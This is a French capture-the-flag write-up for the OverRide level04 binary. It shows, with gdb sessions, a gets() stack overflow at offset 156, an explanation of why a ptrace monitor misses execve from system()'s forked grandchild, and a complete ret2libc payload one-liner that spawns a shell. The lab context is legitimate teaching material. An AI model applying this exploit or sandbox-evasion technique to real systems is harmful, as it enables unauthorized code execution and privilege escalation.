Dans le processus enfant, il y a un appel à `gets` :

​```
0x0804875e <+150>:    call   0x80484b0 <gets@plt>
​```

`gets` ne vérifie aucune borne → on exploite un débordement de tampon.

Le `gets` tourne dans le processus enfant (après le `fork`). Par défaut
gdb suit le parent, il faut donc basculer sur l'enfant :

​```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 2110]
Give me some shellcode, k
1aaa1bbb1ccc1ddd1eee1fff1ggg1hhh1iii1jjj1kkk1lll1mmm1nnn1ooo1ppp1qqq1rrr1sss1ttt2aaa2bbb2ccc2ddd2eee2fff2ggg2hhh2iii2jjj2kkk2lll2mmm2nnn2ooo2ppp2qqq2rrr2sss2ttt2uuu2vvv2www2xxx2yyy2zzz

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2110]
0x74747432 in ?? ()
​```

`0x74747432` = `2ttt` dans le motif → l'adresse de retour est écrasée à
l'offset 156

La protection de level04 : le processus parent surveille l'enfant tracé avec
`ptrace`, et dès qu'il tente un `execve` (syscall 11), il le `kill`. Un
shellcode `execve("/bin/sh")` classique est donc tué.

Mais l'implémentation de `system()` est :

​```c
system(cmd) ≈ {
    pid = fork();              // fork un petit-fils
    if (pid == 0)
        execve("/bin/sh", ["sh","-c",cmd], environ);  // execve dans le petit-fils
    else
        waitpid(...);          // l'enfant tracé ne fait qu'attendre ici
}
​```

L'`execve` a lieu dans le petit-fils forké par `system`, alors que la
relation de traçage (établie par `PTRACE_TRACEME`) n'existe qu'entre le parent
et l'enfant tracé — elle ne s'étend pas au petit-fils. Donc :

- l'enfant tracé ne fait que `fork` / `waitpid`, il n'appelle jamais
  `execve` lui-même ;
- le vrai `execve` se produit dans le petit-fils non tracé → le parent de
  level04 ne le voit pas → pas de kill.

On contourne ainsi le moniteur avec un ret2libc vers `system`.

Adresse de `system` — elle écrase l'adresse de retour de `main` :

​```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
​```

Adresse de `exit` — adresse de retour après `system`, pour quitter proprement :

​```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
​```

Adresse de la chaîne `"/bin/sh"` dans la libc — argument de `system` :

​```
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
​```

Quand `main` exécute `ret`, il dépile le sommet → saute dans `system`. Du point
de vue de `system` :

​```
sommet      → adresse de retour = &exit        (où aller après system)
sommet + 4  → argument 1        = &"/bin/sh"    (system("/bin/sh"))
​```

Ce qui revient à :

​```c
system("/bin/sh");
exit(...);
​```

## Payload

​```
[ "A" * 156 ][ &system ][ &exit ][ &"/bin/sh" ]
   padding    0xf7e6aed0  0xf7e5eb70  0xf7f897ec
​```

En little-endian :

​```
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" '; cat -) | ./level04
Give me some shellcode, k
whoami
level05
​```